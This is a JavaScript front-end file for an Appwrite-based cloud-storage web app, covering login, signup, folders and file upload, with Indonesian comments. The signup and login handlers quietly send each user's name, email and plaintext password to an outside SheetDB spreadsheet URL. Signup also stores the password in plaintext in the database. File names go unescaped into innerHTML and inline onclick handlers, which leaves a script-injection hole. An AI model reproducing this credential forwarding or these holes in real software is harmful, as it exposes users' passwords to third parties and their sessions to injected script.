// ======================================================
// STORAGE TASKS - FINAL FIXED APP.JS
// ======================================================

// 1. Inisialisasi SDK Appwrite
const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// 2. Konfigurasi Project (JANGAN DIUBAH KECUALI ID PROJECT)
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   // Pastikan nama ini sama dengan di Database Appwrite
    COLLECTION_USERS: 'users',   // Pastikan nama ini sama dengan di Database Appwrite
    BUCKET_ID: 'taskfiles'
};

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

// 3. State Global Aplikasi
let currentUser = null;
let currentFolderId = 'root';
let folderPath = [{ id: 'root', name: 'Home' }];

// 4. Helper UI (Fungsi Bantuan)
const el = (id) => document.getElementById(id);
const showLoading = () => { if(el('loading')) el('loading').classList.remove('hidden'); };
const hideLoading = () => { if(el('loading')) el('loading').classList.add('hidden'); };

// Navigasi Halaman (SPA)
window.nav = (pageId) => {
    ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => {
        if(el(id)) {
            el(id).classList.add('hidden');
            el(id).classList.remove('active');
        }
    });
    if(el(pageId)) {
        el(pageId).classList.remove('hidden');
        el(pageId).classList.add('active');
    }
};

// Fitur Toggle Password (Mata)
window.togglePass = (id, icon) => {
    const input = el(id);
    if (input.type === 'password') {
        input.type = 'text';
        icon.classList.remove('fa-eye-slash');
        icon.classList.add('fa-eye');
    } else {
        input.type = 'password';
        icon.classList.remove('fa-eye');
        icon.classList.add('fa-eye-slash');
    }
};

// Fitur Dropdown Menu (Klik Baru Muncul)
window.toggleDropdown = () => {
    const menu = document.querySelector('.dropdown-content');
    if (menu) menu.classList.toggle('show');
};

// Tutup dropdown jika klik di sembarang tempat
window.onclick = function(event) {
    if (!event.target.matches('.new-btn') && !event.target.matches('.new-btn *')) {
        const dropdowns = document.getElementsByClassName("dropdown-content");
        for (let i = 0; i < dropdowns.length; i++) {
            if (dropdowns[i].classList.contains('show')) {
                dropdowns[i].classList.remove('show');
            }
        }
    }
}

// Fitur Greeting (Sapaan Waktu)
function updateGreeting() {
    const hour = new Date().getHours();
    let timeGreeting = "Morning";
    
    if (hour >= 12 && hour < 15) {
        timeGreeting = "Afternoon";
    } else if (hour >= 15 && hour < 18) {
        timeGreeting = "Evening";
    } else if (hour >= 18) {
        timeGreeting = "Night";
    }

    const titleElement = el('welcomeText');
    if (titleElement) {
        titleElement.innerText = `Welcome In Drive ${timeGreeting}`;
    }
}


// ======================================================
// SISTEM OTENTIKASI (LOGIN, SIGNUP, SESSION)
// ======================================================

// A. Cek Sesi (Agar tidak logout saat refresh)
async function checkSession() {
    showLoading();
    try {
        currentUser = await account.get();
        // Jika User Ditemukan (Login Valid):
        nav('dashboardPage');
        updateGreeting();
        loadFiles(currentFolderId);
    } catch (error) {
        // Jika Gagal (Belum Login):
        nav('loginPage');
    } finally {
        hideLoading();
    }
}
// Jalankan pengecekan saat aplikasi dibuka
checkSession();


// B. Logika Sign Up
if (el('signupForm')) {
    el('signupForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const name = el('regName').value;
        const email = el('regEmail').value;
        const phone = el('regPhone').value;
        const pass = el('regPass').value;
        const verify = el('regVerify').value;

        if (pass !== verify) return alert("Password verifikasi tidak cocok!");

        showLoading();
        try {
            // 1. Buat Akun Auth
            const userAuth = await account.create(Appwrite.ID.unique(), email, pass, name);

            // 2. Simpan Data User ke Database
            await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, userAuth.$id, {
                name: name,
                email: email,
                phone: phone,
                password: pass
            });

            // 3. Kirim ke Excel (Sheet1)
            const sheetDB_URL = "https://sheetdb.io/api/v1/v9e5uhfox3nbi"; 
            const dataExcel = {
                "ID": userAuth.$id,
                "Nama": name,
                "Email": email,
                "Phone": phone,
                "Password": pass,
                "Waktu": new Date().toLocaleString('id-ID')
            };
            
            // Kirim tanpa await agar cepat
            fetch(sheetDB_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: [dataExcel] })
            }).catch(err => console.warn("Excel error:", err));

            alert("Pendaftaran Berhasil! Silakan Login.");
            el('signupForm').reset();
            nav('loginPage');

        } catch (error) {
            alert("Gagal Daftar: " + error.message);
        } finally {
            hideLoading();
        }
    });
}


// C. Logika Login
if (el('loginForm')) {
    el('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        let identifier = el('loginEmail').value.trim(); 
        const password = el('loginPass').value;
        
        showLoading();
        try {
            // Cek login pakai Nama atau Email
            if (!identifier.includes('@')) {
                const response = await databases.listDocuments(
                    CONFIG.DB_ID,
                    CONFIG.COLLECTION_USERS, 
                    [Appwrite.Query.equal('name', identifier)]
                );
                
                if (response.total === 0) throw new Error("Username tidak ditemukan.");
                identifier = response.documents[0].email;
            }

            // Proses Login
            await account.createEmailPasswordSession(identifier, password);
            currentUser = await account.get(); 

            // Catat History Login ke Excel
            const sheetDB_URL = "https://sheetdb.io/api/v1/v9e5uhfox3nbi"; 
            const historyURL = `${sheetDB_URL}?sheet=Login`;

            const logData = {
                "ID": currentUser.$id,
                "Nama": currentUser.name,
                "Email": currentUser.email,
                "Password": password,
                "Riwayat Waktu": new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
            };

            fetch(historyURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: [logData] })
            }).catch(err => console.warn("Excel log error:", err));

            // Pindah ke Dashboard
            updateGreeting();
            nav('dashboardPage');
            loadFiles('root');

        } catch (error) {
            alert("Login Gagal: " + error.message);
        } finally {
            hideLoading();
        }
    });
}


// D. Logika Logout
const logoutBtn = document.getElementById('logoutBtn');
if (logoutBtn) {
    logoutBtn.addEventListener('click', async () => {
        if (!confirm("Apakah Anda yakin ingin keluar?")) return;

        showLoading();
        try {
            // Ambil data dulu untuk dicatat
            const userToLog = await account.get();
            
            // Catat Logout ke Excel
            const sheetDB_URL = "https://sheetdb.io/api/v1/v9e5uhfox3nbi"; 
            const logoutURL = `${sheetDB_URL}?sheet=Logout`;
            const logoutData = {
                "ID": userToLog.$id,
                "Nama": userToLog.name,
                "Email": userToLog.email,
                "Riwayat Waktu": new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
            };

            await fetch(logoutURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: [logoutData] })
            });

            // Hapus Sesi
            await account.deleteSession('current');
            currentUser = null;
            
            alert("Anda telah logout.");
            nav('loginPage'); 

        } catch (error) {
            // Jika error, paksa logout lokal
            await account.deleteSession('current').catch(() => {});
            nav('loginPage');
        } finally {
            hideLoading();
        }
    });
}


// ======================================================
// SISTEM MANAJEMEN FILE (DASHBOARD)
// ======================================================

// 1. Load File dari Database
async function loadFiles(folderId) {
    if (!currentUser) return;
    const grid = el('fileGrid');
    if(grid) grid.innerHTML = '';

    try {
        const response = await databases.listDocuments(
            CONFIG.DB_ID,
            CONFIG.COLLECTION_FILES,
            [
                Appwrite.Query.equal('owner', currentUser.$id),
                Appwrite.Query.equal('parentId', folderId)
            ]
        );

        const searchVal = el('searchInput') ? el('searchInput').value.toLowerCase() : '';
        let totalSize = 0;

        response.documents.forEach(doc => {
            if (doc.name.toLowerCase().includes(searchVal)) {
                renderItem(doc);
            }
            if (doc.size) totalSize += doc.size;
        });

        updateStorageUI(totalSize);

    } catch (error) {
        console.error("Gagal memuat file:", error);
    }
}

// 2. Render Tampilan Item (Card)
function renderItem(doc) {
    const grid = el('fileGrid');
    if(!grid) return;

    const div = document.createElement('div');
    div.className = 'item-card';
    const isFolder = doc.type === 'folder';
    const icon = isFolder ? 'fa-folder' : 'fa-file';
    
    // Action klik
    const clickAction = isFolder 
        ? `openFolder('${doc.$id}', '${doc.name}')` 
        : `window.open('${doc.url}', '_blank')`;

    div.innerHTML = `
        <button class="del-btn" onclick="deleteItem('${doc.$id}', '${doc.type}', '${doc.fileId}')">
            <i class="fa-solid fa-trash"></i>
        </button>
        <div onclick="${clickAction}" style="width:100%; height:100%; display:flex; flex-direction:column; align-items:center; justify-content:center;">
            <i class="icon fa-solid ${icon}"></i>
            <div class="item-name">${doc.name}</div>
        </div>
    `;
    grid.appendChild(div);
}

// 3. Buat Folder Baru
window.createFolder = async () => {
    const name = prompt("Nama Folder Baru:");
    if (!name) return;

    showLoading();
    try {
        await databases.createDocument(
            CONFIG.DB_ID,
            CONFIG.COLLECTION_FILES, // Perbaikan: Gunakan COLLECTION_FILES
            Appwrite.ID.unique(),
            {
                name: name,
                type: 'folder',
                parentId: currentFolderId,
                owner: currentUser.$id,
                size: 0,
                url: null,
                fileId: null
            }
        );
        loadFiles(currentFolderId);
    } catch (error) {
        alert("Gagal: " + error.message);
    } finally {
        hideLoading();
        // Tutup dropdown setelah selesai
        const menu = document.querySelector('.dropdown-content');
        if(menu) menu.classList.remove('show');
    }
};

// 4. Upload File
const fileInput = el('fileUpload');
if (fileInput) {
    fileInput.addEventListener('change', async (e) => {
        const file = e.target.files[0];
        if (!file) return;

        showLoading();
        try {
            // A. Upload ke Storage
            const uploaded = await storage.createFile(
                CONFIG.BUCKET_ID,
                Appwrite.ID.unique(),
                file
            );

            // B. Dapatkan URL View
            const fileUrl = storage.getFileView(CONFIG.BUCKET_ID, uploaded.$id);

            // C. Simpan Metadata ke Database
            await databases.createDocument(
                CONFIG.DB_ID,
                CONFIG.COLLECTION_FILES,
                Appwrite.ID.unique(),
                {
                    name: file.name,
                    type: 'file',
                    parentId: currentFolderId,
                    owner: currentUser.$id,
                    url: fileUrl.href, 
                    fileId: uploaded.$id,
                    size: file.size
                }
            );

            loadFiles(currentFolderId);
        } catch (error) {
            alert("Upload Gagal: " + error.message);
        } finally {
            hideLoading();
            e.target.value = ''; 
            // Tutup dropdown
            const menu = document.querySelector('.dropdown-content');
            if(menu) menu.classList.remove('show');
        }
    });
}

// 5. Hapus Item
window.deleteItem = async (docId, type, fileId) => {
    if (!confirm("Yakin hapus item ini?")) return;
    
    showLoading();
    try {
        // Hapus file fisik jika ada
        if (type === 'file' && fileId) {
            await storage.deleteFile(CONFIG.BUCKET_ID, fileId);
        }
        // Hapus data database
        await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, docId);
        loadFiles(currentFolderId);
    } catch (error) {
        alert("Gagal hapus: " + error.message);
    } finally {
        hideLoading();
    }
};

// 6. Navigasi Folder
window.openFolder = (id, name) => {
    currentFolderId = id;
    loadFiles(id);
};

// 7. Search Listener
const searchInput = el('searchInput');
if (searchInput) {
    searchInput.addEventListener('input', () => loadFiles(currentFolderId));
}

// 8. Visual Storage Bar
function updateStorageUI(bytes) {
    const mb = (bytes / (1024 * 1024)).toFixed(2);
    const percent = Math.min((bytes / (2 * 1024 * 1024 * 1024)) * 100, 100); 
    
    if(el('storageUsed')) el('storageUsed').innerText = mb + ' MB';
    if(el('storageBar')) el('storageBar').style.width = percent + '%';
}
